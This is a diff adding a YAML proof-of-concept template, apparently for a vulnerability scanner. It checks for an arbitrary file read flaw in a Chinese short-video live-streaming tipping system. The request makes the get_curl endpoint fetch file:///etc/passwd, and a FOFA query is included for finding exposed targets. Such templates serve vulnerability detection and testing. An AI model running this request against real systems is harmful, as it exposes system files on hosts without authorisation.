@@ -1,0 +1,18 @@
+id: poc-yaml-short-video-reward-get-curl-fileread
+info:
+  name: 短视频直播打赏系统 get_curl 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 短视频直播打赏系统
+  fofa: 'Location: https://m.baidu.com" && domain!="baidu.com'
+requests:
+- method: GET
+  path: /caiji/get_curl?url=file:///etc/passwd
+  expression: 'status_code == 200 &&
+
+    matches(body, "root:.*:0:0:")
+
+    '
+variables: {}
+transport: http
